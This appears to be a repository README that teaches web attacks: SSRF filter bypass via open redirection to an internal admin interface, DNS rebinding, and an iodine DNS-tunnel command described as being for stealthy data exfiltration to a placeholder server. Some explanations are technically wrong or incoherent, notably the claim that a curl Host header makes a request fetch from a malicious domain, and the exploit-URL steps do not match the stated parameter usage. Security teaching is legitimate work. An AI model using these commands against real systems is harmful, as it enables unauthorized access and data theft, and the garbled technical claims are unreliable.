# Introduction to Web Attacks

This repository is dedicated to providing a comprehensive understanding of various types of web attacks. In today's internet era, web attacks pose a significant threat, with attackers exploiting vulnerabilities in web applications to gain unauthorized access, steal sensitive data, or disrupt services.

# SSRF with Filter Bypass via Open Redirection

Server-Side Request Forgery (SSRF) poses a significant threat to web security. Understanding the basics of basic filter bypass techniques is crucial for effective penetration testing.

## Example Command

```bash
curl -i http://vulnerable-server.local/request?url=http://internal-server.local/
```

## Exploiting the Vulnerability

- Modifying the `stockApi` parameter directly is prevented.
- **Crafting the Exploit URL:**
  - Create a crafted URL to exploit the redirection, such as redirecting to the admin interface:
    ```plaintext
    /product/nextProduct?path=http://192.168.0.12:8080/admin
    ```
- **Using the Exploit URL:**
  - Utilize this URL in the `stockApi` parameter:
    ```bash
    curl -i "http://vulnerable-server.local/product/nextProduct?path=http://192.168.0.12:8080/admin"
    ```
- **Exploiting the Vulnerability:**
  - The stock checker follows the redirection and displays the admin page, enabling actions like user deletion.

These steps illustrate how an open redirection vulnerability can be exploited to bypass SSRF filters and execute unauthorized actions on internal systems.

## DNS Rebinding: SSRF Filter Bypass

DNS Rebinding enhances SSRF attacks by circumventing DNS-result-checked filters at request time.

### Example Command:
- **Bypassing DNS Filter with Rebinding:**
  - Command:
    ```bash
    curl -H "Host: malicious-website.com" http://target-server.local/resource
    ```
  - *Description: This command demonstrates how an attacker configures a DNS server with a short TTL to periodically change the IP address of `malicious-website.com`. The `curl` command then sends a request to `target-server.local`, but the Host header tricks the request into fetching a resource from `malicious-website.com`.*

## DNS Rebinding: Same-Origin Policy Bypass

DNS Rebinding can bypass the crucial Same-Origin Policy to exploit vulnerabilities.

### Example Command:
- **Setting up a Local Server for Same-Origin Policy Bypass:**
  - Command:
    ```bash
    python -m http.server 8080
    ```
  - *Description: This command sets up a simple HTTP server on port 8080. The server can be used to test for vulnerabilities in cross-origin resource sharing (CORS) via DNS rebinding, allowing access to resources that would normally be restricted by the Same-Origin Policy.*

## DNS Rebinding: Tools & Prevention

Understanding both offensive and defensive tools is crucial in mitigating DNS Rebinding threats.

### Tool Example:
- **Using `nslookup`:**
  - Command:
    ```bash
    nslookup target-domain.com
    ```
  - *Description: This command helps to explore and identify potential harmful DNS configurations susceptible to rebinding attacks by resolving the domain name to its corresponding IP addresses.*

### Advanced DNS Tunneling Command:
- **Setting up a DNS Tunnel with `iodine`:**
  - Command:
    ```bash
    iodine -f -P password -T CNAME tunnel.your-server.com
    ```
  - *Description: This command sets up a DNS tunnel using `iodine`, allowing data encapsulation within DNS queries and responses for stealthy data exfiltration.*
